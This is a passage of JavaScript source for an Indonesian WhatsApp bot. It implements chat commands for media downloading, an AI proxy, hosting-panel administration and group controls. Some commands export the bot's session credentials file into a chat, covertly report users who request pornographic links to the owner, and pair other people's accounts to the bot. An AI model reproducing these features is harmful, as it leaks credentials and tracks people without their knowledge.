 const pasteId = link.split('/').pop(); 
 try {
 const response = await fetch(`https://pastebin.com/raw/${pasteId}`);
 if (!response.ok) return m.reply('Gagal mengambil isi dari Pastebin.');
 const content = await response.text();
 if (!content) return m.reply('Tidak ada isi yang ditemukan di Pastebin!');
 m.reply(`${content}`);
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan saat mengambil data dari Pastebin.');
 }
}
break

case 'toenchant':{
 try {
 const charMap = {
 a: "ᔑ",
 b: "ʖ",
 c: "ᓵ",
 d: "↸",
 e: "ᒷ",
 f: "⎓",
 g: "⊣",
 h: "⍑",
 i: "╎",
 j: "⋮",
 k: "ꖌ",
 l: "ꖎ",
 m: "ᒲ",
 n: "リ",
 o: "𝙹",
 p: "!¡",
 q: "ᑑ",
 r: "∷",
 s: "ᓭ",
 t: "ℸ ̣",
 u: "⚍",
 v: "⍊",
 w: "∴",
 x: "̇/",
 y: "||",
 z: "⨅"
 }
 if (!text) return m.reply("Harap masukkan teks yang ingin convert!")
 const convertToEnchant = async (text) => {
 return new Promise((resolve) => {
 const result = text
 .toLowerCase()
 .split("")
 .map((char) => charMap[char] || char)
 .join("")
 resolve(result)
 })
 }
 const loli = await convertToEnchant(text)
 m.reply(`*Input:*\n${text}\n\n*Hasil convert:*\n${loli}`)
 } catch (err) {
 return err
 }
 }
 break 
 case "getlink": {
 const randomLink = links[Math.floor(Math.random() * links.length)]; 
 reply(`🔗 Link Bok3p Jir: ${randomLink}\n\jika ingin download ketik .videy link video`);
 let ownerId = `${global.nomerowner}@s.whatsapp.net`;
 Yasam.sendMessage(ownerId, { text: `Sayang ada yang chat aku nih, ${m.sender.split("@")[0]} dia mengetik ini ${prefix + command}` });
 }
break 	
case 'upsw': 
 {
 if (!YasamCreator) return replygcxeon('Owners only') 
 if (args.length < 1) return m.reply("perihal apa?");
 if (/image/.test(mime)) {
 let imgSw = await Yasam.downloadAndSaveMediaMessage(quoted);
 await Yasam.sendMessage(
 "status@broadcast",
 { image: { url: imgSw }, caption: q },
 { statusJidList: xeonverifieduser },
 );
 replygcxeon('Done')
 } else if (/video/.test(mime)) {
 let VidSw = await Yasam.downloadAndSaveMediaMessage(quoted);
 await Yasam.sendMessage(
 "status@broadcast",
 { video: { url: VidSw }, caption: q },
 { statusJidList: xeonverifieduser },
 );
 replygcxeon('Done')
 
 } else if (/audio/.test(mime)) {
 let VnSw = await Yasam.downloadAndSaveMediaMessage(quoted);
 await Yasam.sendMessage(
 "status@broadcast",
 { audio: { url: VnSw }, mimetype: "audio/mp4", ptt: true }, 
 { backgroundColor: "#FF000000", statusJidList: xeonverifieduser }, // #FF000000
 );
 replygcxeon('Done')
 } else if (q) {
 Yasam.sendMessage(
 "status@broadcast",
 { text: q },
 { backgroundColor: "#FF000000", font: 3, statusJidList: xeonverifieduser },
 );
 } else {
 replygcxeon(
 "Replay Media Jika Mau Dengan Caption Ketik .status caption",
 );
 }
 }
break 	
case 'play': {
 if (args.length === 0) return Yasam.sendMessage(m.chat, { text: `Ketikkan nama lagu atau URL YouTube, misalnya:\nplay dj kane` }, { quoted: m });

 const query = args.join(' ');
 const axios = require('axios');
 const yts = require('yt-search');

 try {
 const search = await yts(query);
 if (!search || search.all.length === 0) return Yasam.sendMessage(m.chat, { text: 'Lagu yang Anda cari tidak ditemukan.' }, { quoted: m });

 const video = search.all[0];
 const detail = `*Youtube Audio Play*

*❖ Judul* : ${video.title}
*❖ Penonton* : ${video.views}
*❖ Pengarang* : ${video.author.name}
*❖ Diunggah* : ${video.ago}
*❖ URL* : ${video.url}
_Proses pengunduhan audio..._`;

 await Yasam.sendMessage(m.chat, { text: detail }, { quoted: m });

 const format = 'mp3';
 const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(video.url)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;

 const response = await axios.get(url, {
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 });

 if (!response.data || !response.data.success) return Yasam.sendMessage(m.chat, { text: 'Gagal mengunduh audio.' }, { quoted: m });

 const { id, title, info } = response.data;
 const { image } = info;

 while (true) {
 const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 });

 if (progress.data && progress.data.success && progress.data.progress === 1000) {
 const downloadUrl = progress.data.download_url;

 await Yasam.sendMessage(m.chat, {
 audio: { url: downloadUrl },
 mimetype: 'audio/mpeg',
 fileName: `${title}.mp3`
 }, { quoted: m });
 break;
 }
 await new Promise(resolve => setTimeout(resolve, 5000));
 }
 } catch (error) {
 console.error('Error:', error);
 Yasam.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mencoba mengunduh audio.' }, { quoted: m });
 }
}
break;
case 'cuaca': {
if (!text) return reply(`Example : ${prefix + command} palembang`) 
 try {
 let response = await axios.get(`https://server.apisanz.my.id/search/cuaca?text=${text}`);
 let ans = response.data.data.caption
 Yasam.sendMessage(m.chat, { image: { url: response.data.data.iconUrl }, caption: ans }, { quoted: m })
 } catch (e) {
 console.error(e.message);
 return reply("Error");
 }
 }
break

case 'igdl':
case 'instagram': {
const qs = require('qs');
async function instanav(url) {
 const data = qs.stringify({
 'q': url,
 't': 'media',
 'lang': 'en'
 });

 const config = {
 method: 'POST',
 url: 'https://instanavigation.app/api/ajaxSearch',
 headers: {
 'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
 'Accept': 'application/json, text/javascript, */*; q=0.01',
 'accept-language': 'id-ID',
 'referer': 'https://instanavigation.app/',
 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'x-requested-with': 'XMLHttpRequest',
 'origin': 'https://instanavigation.app',
 'alt-used': 'instanavigation.app',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-origin',
 'priority': 'u=0',
 'te': 'trailers',
 },
 data: data
 };

 const api = await axios.request(config);
 const html = api.data.data;

 const $ = cheerio.load(html);
 const thumbnail = $('.download-items__thumb img').attr('src');

 const downloadUrls = [];
 $('.download-items__btn a').each((index, element) => {
 const href = $(element).attr('href');
 if (href) {
 downloadUrls.push(href);
 }
 });

 const urlParams = new URLSearchParams(downloadUrls[0]?.split('?')[1]); // Ambil filename dari URL pertama
 let filename = urlParams.get('filename');
 if (filename && filename.endsWith('.mp4')) {
 filename = filename.slice(0, -4);
 }

 return {
 title: filename || 'Title not found',
 thumbnail: thumbnail || 'Thumbnail not found',
 downloadUrls: downloadUrls.length > 0 ? downloadUrls : ['Download URL not found']
 };
}
if (limitnya < 1) return reply(mess.limit)

 if (args.length == 0) {
 reply(`Example: ${prefix + command} <link Instagram>`);
 break;
 }
 const url = args[0];
 if (!url.match(/instagram\.com\/(reel|p|tv)/gi)) {
 reply('URL yang Anda masukkan salah! Pastikan URL adalah link Instagram Reel, Post, atau TV.');
 break;
 }
 try {
 const result = await instanav(url);
 const caption = `乂 *I N S T A G R A M D O W N L O A D*

• *Nama Video:* 
${result.title}

• *Thumbnail:* 
${result.thumbnail}

${global.namabot}`;
 if (result.downloadUrls[0] !== 'Download URL not found') {
 await Yasam.sendMessage(m.chat, { 
 video: { url: result.downloadUrls[0] }, 
 caption: caption 
 });
 } else {
 reply('Maaf, video tidak ditemukan. Pastikan URL valid.');
 }
 } catch (e) {
 console.log(e);
 reply('Terjadi kesalahan saat memproses URL. Pastikan URL benar.');
 }
 uselimit();
 }
 break;

case 'listjadibot': 
 if (!YasamCreator) return m.reply(mess.owner)
try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await Yasam.ecodeJid(i.id)
te += " • User : @" + y.split("@")[0] + "\n"
te += " • Name : " + i.name + "\n\n"
}
Yasam.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcxeon(`Belum Ada User Yang Jadibot`)
}
break 
 case "jadibot-pairing": {
 if (!text) return replygcxeon('*<!> Example:* .jadibot 628xxx')
if (!YasamCreator) return replygcxeon('Khusus Owner')
if (m.isGroup) return replygcxeon("Maaf Kak Fitur Ini Hanya Bisa Di Gunakan Di Pribadi Chat") 
await jadibot(Yasam, text, fkontak, from)
 let loli = '`'
 await sleep(4500) 
 replygcxeon(`*Masukkan code dibawah ini untuk jadi bot sementara*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code di bawah ini\n\nNote: code dapat expired kapan saja!\n\nCode: ${loli}${global.codepairing}${loli}\nJika Code Error Silahkan Hapus Folder Jadibot`);
 
}
break 
case "jadibot-scan":
		 	 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!isPremium) return replygcxeon("*`Khusus Prem Saya kak`*") 
 if (m.isGroup) return replygcxeon("Maaf Kak Fitur Ini Hanya Bisa Di Gunakan Di Pribadi Chat") 
 await jadibot(Yasam, m, from)
 break 
case 'ocr': {
const { ocrSpace } = require("ocr-space-api-wrapper");
let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!mime) return m.reply("Fotonya Mana? Reply gambar atau upload");
 if (!/image\/(jpe?g|png)/.test(mime))
 return m.reply(`Tipe ${mime} tidak didukung!`);
 let image = await q.download();
 let download = await Yasam.getFile(image, true);
 let ocr = await ocrSpace(download.filename);
 await Yasam.sendMessage(
 m.chat,
 { text: ocr.ParsedResults[0].ParsedText.trim() },
 { quoted: m },
 );
}
break 
case 'dels':
 case 'delsampah':{
 	 if (!YasamCreator) return replygcxeon (mess.owner)
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return reply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file Kenangan <3\n\n`
	if(filteredArray.length == 0) return replygcxeon(`${teks}`)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	replygcxeon(`${teks}`)
	
await sleep(2000)
	replygcxeon("Menghapus file Kenangan...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	await sleep(2000)
	replygcxeon("Berhasil menghapus semua Kenangan <3")
	 
	});
	 }
	break 
case 'ai': case 'openai': {
	if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
 if (!text) return m.reply("Masukan query!");
 let sessions = readSession();
 let userSession = sessions[m.sender] || "";
 try {
 let question = userSession ? `${userSession}\n${text}` : text;
 var URL = "https://meitang.xyz/openai";
 let { data } = await axios({
 method: "GET",
 url: URL,
 params: { text: question }
 });
 if (data.status) {
 sessions[m.sender] = `${question}\n${data.result}`;
 writeSession(sessions);
 m.reply(data.result);
 } else {
 m.reply("Gagal mendapatkan respons dari API.");
 }
 } catch (e) {
 console.log(e);
 m.reply("Sesi sudah mencapai batas!\nketik .resetsesi dan coba lagi.");
 }
}
break;
case 'resetsesi': {
 let sessions = readSession();
 delete sessions[m.sender];
 writeSession(sessions);
 m.reply("Sesi AI berhasil direset!");
}
break; 	
case 'snack':
case 'snackvideo': {
 if (!text) {
 return m.reply(`Masukan Urls\n\nExample: ${prefix + command} https://www.snackvideo.com/@kwai/video/5198711450969422814?pwa_source=web_share`);
 }

 async function scraperSnackVideoDL(url) {
 const res = await fetch(url);
 const body = await res.text();
 const $ = cheerio.load(body);
 const video = $("div.video-box").find("a-video-player");
 const author = $("div.author-info");
 const attr = $("div.action");

 const results = {
 title: $(author).find("div.author-desc > span").children("span").eq(0).text().trim(),
 thumbnail: $(video).parent().siblings("div.background-mask").children("img").attr("src"),
 media: $(video).attr("src"),
 author: $("div.author-name").text().trim(),
 authorImage: $(attr).find("div.avatar > img").attr("src"),
 like: $(attr).find("div.common").eq(0).text().trim(),
 comment: $(attr).find("div.common").eq(1).text().trim(),
 share: $(attr).find("div.common").eq(2).text().trim(),
 };

 return results;
 }

 m.reply(mess.wait);
 let snackVid = await scraperSnackVideoDL(text);
 let caption = ` ㅤִ 𑙕┄─╌??ׄ╌─┄ ۪ 𑙕 ִ 
 ıl ִ αuτhִ𐐫r ׄ 𐨐 ִ ${snackVid.author} ׄ 𝅄
 ıl ִ titlε ׄ 𐨐 ִ ${snackVid.title}`;

 await Yasam.sendMessage(m.chat, { 
 video: { url: snackVid.media }, 
 caption: caption 
 }, { quoted: m });
}
break;

case 'ffinfo':{
 if (!args[0]) {
 return m.reply(`Masukkan ID Game Free Fire.\n\nContoh:\n${prefix + command} 12345678`);
 }

 try {
 await m.reply("_Sedang memproses data..._");

 const url = `https://api.vreden.web.id/api/ffstalk?id=${args[0]}`;
 const response = await axios.get(url);

 if (!response.data || !response.data.result) {
 return m.reply('Data tidak ditemukan atau ID yang dimasukkan salah.');
 }

 console.log('API Response:', response.data);

 const result = response.data.result;

 const account = {
 id: result?.account?.id || 'Tidak tersedia',
 name: result?.account?.name || 'Tidak tersedia',
 level: result?.account?.level || 'Tidak tersedia',
 xp: result?.account?.xp || 'Tidak tersedia',
 region: result?.account?.region || 'Tidak tersedia',
 like: result?.account?.like || 'Tidak tersedia',
 bio: result?.account?.bio || 'Tidak tersedia',
 create_time: result?.account?.create_time || 'Tidak tersedia',
 last_login: result?.account?.last_login || 'Tidak tersedia',
 honor_score: result?.account?.honor_score || 'Tidak tersedia',
 booyah_pass: result?.account?.booyah_pass || 'Tidak tersedia',
 booyah_pass_badge: result?.account?.booyah_pass_badge || 'Tidak tersedia',
 evo_access_badge: result?.account?.evo_access_badge || 'Tidak tersedia',
 equipped_title: result?.account?.equipped_title || 'Tidak tersedia',
 BR_points: result?.account?.BR_points || 'Tidak tersedia',
 CS_points: result?.account?.CS_points || 'Tidak tersedia',
 };

 const petInfo = {
 name: result?.pet_info?.name || 'Tidak tersedia',
 level: result?.pet_info?.level || 'Tidak tersedia',
 type: result?.pet_info?.type || 'Tidak tersedia',
 xp: result?.pet_info?.xp || 'Tidak tersedia',
 };

 const guild = {
 name: result?.guild?.name || 'Tidak tersedia',
 id: result?.guild?.id || 'Tidak tersedia',
 level: result?.guild?.level || 'Tidak tersedia',
 member: result?.guild?.member || 'Tidak tersedia',
 capacity: result?.guild?.capacity || 'Tidak tersedia',
 };

 const ketuaGuild = {
 create_time: result?.ketua_guild?.create_time || 'Tidak tersedia',
 last_login: result?.ketua_guild?.last_login || 'Tidak tersedia',
 BP_bagdes: result?.ketua_guild?.BP_bagdes || 'Tidak tersedia',
 BR_points: result?.ketua_guild?.BR_points || 'Tidak tersedia',
 CS_points: result?.ketua_guild?.CS_points || 'Tidak tersedia',
 level: result?.ketua_guild?.level || 'Tidak tersedia',
 like: result?.ketua_guild?.like || 'Tidak tersedia',
 name: result?.ketua_guild?.name || 'Tidak tersedia',
 equipped_title: result?.ketua_guild?.equipped_title || 'Tidak tersedia',
 id: result?.ketua_guild?.id || 'Tidak tersedia',
 xp: result?.ketua_guild?.xp || 'Tidak tersedia',
 };

 
 const resultText = `*[ STALK FF ]*\n\n` +
 `> *Account Info:*\n` +
 ` *ID*: ${account.id}\n` +
 ` *Name*: ${account.name}\n` +
 ` *Level*: ${account.level}\n` +
 ` *XP*: ${account.xp}\n` +
 ` *Region*: ${account.region}\n` +
 ` *Like*: ${account.like}\n` +
 ` *Bio*: ${account.bio}\n` +
 ` *Created At*: ${account.create_time}\n` +
 ` *Last Login*: ${account.last_login}\n` +
 ` *Honor Score*: ${account.honor_score}\n` +
 ` *Booyah Pass*: ${account.booyah_pass}\n` +
 ` *Booyah Badge*: ${account.booyah_pass_badge}\n` +
 ` *Evo Access Badge*: ${account.evo_access_badge}\n` +
 ` *Equipped Title*: ${account.equipped_title}\n` +
 ` *BR Points*: ${account.BR_points}\n` +
 ` *CS Points*: ${account.CS_points}\n\n` +
 `> *Pet Info:*\n` +
 ` *Name*: ${petInfo.name}\n` +
 ` *Level*: ${petInfo.level}\n` +
 ` *Type*: ${petInfo.type}\n` +
 ` *XP*: ${petInfo.xp}\n\n` +
 `> *Guild Info:*\n` +
 ` *Name*: ${guild.name}\n` +
 ` *ID*: ${guild.id}\n` +
 ` *Level*: ${guild.level}\n` +
 ` *Members*: ${guild.member}\n` +
 ` *Capacity*: ${guild.capacity}\n\n` +
 `> *Guild Leader Info:*\n` +
 ` *Created At*: ${ketuaGuild.create_time}\n` +
 ` *Last Login*: ${ketuaGuild.last_login}\n` +
 ` *BP Badge*: ${ketuaGuild.BP_bagdes}\n` +
 ` *BR Points*: ${ketuaGuild.BR_points}\n` +
 ` *CS Points*: ${ketuaGuild.CS_points}\n` +
 ` *Level*: ${ketuaGuild.level}\n` +
 ` *Like*: ${ketuaGuild.like}\n` +
 ` *Name*: ${ketuaGuild.name}\n` +
 ` *Equipped Title*: ${ketuaGuild.equipped_title}\n` +
 ` *ID*: ${ketuaGuild.id}\n` +
 ` *XP*: ${ketuaGuild.xp}`;

 // Mengirimkan hasil ke pengguna
 await Yasam.sendMessage(m.chat, { text: resultText, mentions: [m.sender] }, { quoted: m });
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan saat mengambil data.\n> Error: ' + error.message);
 }
};
break

case 'getdatabase': {
				if (!YasamCreator) return replygcxeon(mess.owner);
				replygcxeon('Tunggu sebentar yaa, aku lagi ambil file database-mu nih');
				let sesi = fs.readFileSync('./database/registered.json');
				Yasam.sendMessage(m.chat, {
					document: sesi,
					mimetype: 'application/json',
					fileName: 'registered.json'
				}, {
					quoted: m
				});
			}
			break; 
case 'getsession': {
				if (!YasamCreator) return replygcxeon(mess.owner);
				replygcxeon('Tunggu sebentar yaa, aku lagi ambil file session-mu nih');
				let sesi = fs.readFileSync(`./${sessionName}/creds.json`);
				Yasam.sendMessage(m.chat, {
					document: sesi,
					mimetype: 'application/json',
					fileName: 'creds.json'
				}, {
					quoted: m
				});
			}
			break;

case 'kusonimesearch':
			case 'animesearch': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return m.reply(`⚠️ Kak, jangan lupa kasih judul anime yang mau dicari! 🥺\nContoh: *${prefix + command} Naruto*`);
				try {
					const searchResults = await Kusonime.search(text);
					if (typeof searchResults === 'string') {
						return m.reply(`⚠️ ${searchResults}`);
					}
					let response = `🔍 *Hasil Pencarian untuk:* ${text}\n\n`;
					searchResults.slice(0, 5).forEach((anime, index) => {
						response += `📺 *${index + 1}. ${anime.title}*\n`;
						response += `🔗 *URL:* ${anime.url}\n`;
						response += `🖼️ *Thumbnail:* ${anime.thumbnail}\n`;
						response += `🗂️ *Genre:* ${anime.genres.join(', ')}\n`;
						response += `📅 *Rilis:* ${anime.releaseTime}\n\n`;
					});
					m.reply(response);
				} catch (error) {
					console.error(error);
					m.reply('⚠️ Terjadi kesalahan saat mencari anime di Kusonime.');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

case 'listusr': {
 if (!YasamCreator) return reply(mess.owner)
 let page = args[0] ? args[0] : '1';
 let f = await fetch(domain + "/api/application/users?page=" + page, {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });
 let res = await f.json();
 let users = res.data;
 let messageText = "Berikut list user:\n\n";
 
 for (let user of users) {
 let u = user.attributes;
 messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
 messageText += `${u.username}\n`;
 messageText += `${u.first_name} ${u.last_name}\n\n`;
 }
 
 messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 messageText += `Total Users: ${res.meta.pagination.count}`;
 
 await Yasam.sendMessage(m.chat, { text: messageText }, { quoted: m });
 
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
 }
}
break; 
case 'delsrv': {
 if (!YasamCreator) return reply(`Khusus ${global.botname} Aja`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
 break
 case 'delusr': {
 if (!YasamCreator) return reply(`Khusus ${global.botname} Aja`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
 break 
case 'addsrv': {
if (!YasamCreator) return replygcxeon(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
// = data.attributes.pStartup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "BUYER ALyaSam || PANEL NYA DI PAKEK YA BUB >•<",
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "/usr/local/bin/${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start",
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
 break

case "gempa": {
if (db.data.users[sender].limit < 1) return replygcxeon(mess.limit)	
const link = 'https://data.bmkg.go.id/DataMKG/TEWS/'
try {
let res = await fetch(link+'autogempa.json')
let anu = await res.json()
anu = anu.Infogempa.gempa
let txt = `*── 「 GEMPA NEWS 」 ──*\n\n${anu.Wilayah}\n\n`
txt += `Potensi : ${anu.Potensi}\n`
txt += `Tanggal : ${anu.Tanggal}\n`
txt += `Waktu : ${anu.Jam}\n\n`
txt += `Magnitude : ${anu.Magnitude}\n`
txt += `Kedalaman : ${anu.Kedalaman}\n`
txt += `Koordinat : ${anu.Coordinates}${anu.Dirasakan.length > 3 ? `\nDirasakan : ${anu.Dirasakan}` : ''}`
await Yasam.sendMessage(m.chat, { image: { url: link+anu.Shakemap }, caption: txt }, { quoted: fvrif })
} catch (e) {
replygcxeon(mess.error.api)
}
}
db.data.users[sender].limit -= 1 // -1 limit
replygcxeon(mess.yas)
break 
case 'neko':
case 'waifu1': {
if (!q) return replygcxeon(`Example: ${prefix + command} sfw/nsfw`)
if (args[0] === "sfw") {
replygcxeon(mess.wait)
let res = await fetch(`https://waifu.pics/api/sfw/${command}`)
let json = await res.json()
let cap = `${mess.berhasil}`
Yasam.sendMessage(from, {image: { url: json.url },caption: mess.berhasil},{ quoted:m })
} else if (args[0] === "nsfw") {
if (m.isGroup) return replygcxeon(mess.private)
replygcxeon(mess.wait)
let res = await fetch(`https://waifu.pics/api/nsfw/${command}`)
let json = await res.json()
let cap = `${mess.berhasil}`
Yasam.sendMessage(from, {image: { url: json.url },caption: mess.berhasil},{ quoted:m })
}
}
break 
case "getsw":{
 if (m.quoted?.chat != "status@broadcast")
return m.reply(`Reply Status WhatsApp !`);
 let buffer = await m.quoted.download();
 await Yasam.sendFile(m.chat, buffer, "", m.quoted.text || "", null, false, {quoted: fvrif,})
.catch((_) => m.reply(m.quoted.text || ""));
}
break;

case 'group': case 'gc': {
if (!m.isGroup) return replygcxeon(mess.grup)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !YasamCreator) return replygcxeon(mess.admin)
if (!q) return replygcxeon(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
 replygcxeon(`*₊˚🗝 ࣪𓂃˚☽ ｡⋆ . . . 「 _it's time_ ${botname} close the store_ 〞*

 ♡゙. . .trimakasii yang suda jajan distoreku hari nii ,semoga rejekinya lancar selaluu˚☽˚｡⋆
 ━ ━༝ ₊˚good night everyone sleep wellﾟ｡??
· · • • • 🪷 • • • ·`)
Yasam.groupSettingUpdate(from, 'announcement')
} else if (args[0] == 'open') {
 replygcxeon(`*₊˚🗝 ࣪𓂃˚☽ ｡⋆ . . . 「 _hello everyone ,it's time to open_ 〞*

 ♡゙. . .ayoo jajan, happy shopping
ketik *.list* untuk melihat list˚☽˚｡⋆
 ━ ━༝ ₊˚ : ﾟ｡𓊇
· · • • • 🪷 • • • ·`)
Yasam.groupSettingUpdate(from, 'not_announcement')
} else {
let msg = generateWAMessageFromContent(from, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: botname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image: { url: './XeonMedia/theme/cheemspic.jpg' } }, { upload: Yasam.waUploadToServer })),
 title: `FLIX BOT AI V11.0.0`,
 gifPlayback: true,
 subtitle: ownername,
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: `{
 "title":"PILIH BUKA/TUTUP ♨️",
 "sections":[{
 "title":"PILIH BUKA/TUTUP ",
 "rows":[{
 "header":"BUKA ✅",
 "title":"MEMILIH ",
 "description":"BUKA✅",
 "id":"${prefix + command} open"
 },
 {
 "header":"TUTUP ❌",
 "title":"MEMILIH ",
 "description":"TUTUP ❌",
 "id":"${prefix + command} close"
 }]
 }]
 }`
 }
 ]
 }),
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 100,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1@newsletter',
 newsletterName: ownername,
 serverMessageId: 143
 }
 }
 })
 }
 }
}, { quoted: fcall });

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
});
}}
break

case 'listonline':
 case 'liston': {
 	if (!m.isGroup) return replygcxeon(mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.admin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)

	 	if (db.data.users[sender].limit < 1) return replygcxeon(mess.limit)
 let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
 let online = [...Object.keys(store.presences[id]), botNumber]
 Yasam.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
 mentions: online
 })
 }
 break
 
 	case 'pindown': {
const jsdom = require('jsdom');
const { JSDOM } = jsdom;

class Pinterest {
 async getURL(Url) {
 try {
 const response = await axios.get(Url);
 const dom = new JSDOM(response.data);
 const document = dom.window.document;
 let contentUrl = '';
 const video = document.querySelector('video');
 if (video) {
 const videoUrl = video.getAttribute('src');
 contentUrl = videoUrl.replace('hls', '720p').replace('.m3u8', '.mp4');
 } else {
 const img = document.querySelector('meta[property="og:image"]');
 if (img) {
 contentUrl = img.getAttribute('content');
 }
 }
 return contentUrl;
 } catch (error) {
 console.error('Ошибка:', error.message);
 return '';
 }
 }
 
 async getBuffer(RawUrl) {
 try {
	 const url = await this.getURL(RawUrl);
 const response = await axios.get(url, { responseType: 'arraybuffer' });
 return response.data;
 } catch (error) {
 console.error('Ошибка:', error.message);
 return null;
 }
 }

 async getUint8ArrayBuffer(RawUrl) {
 try {
	 const url = await this.getURL(RawUrl);
 const response = await axios.get(url, { responseType: 'arraybuffer' });
	 const buffer = Uint8Array.from(response.data);
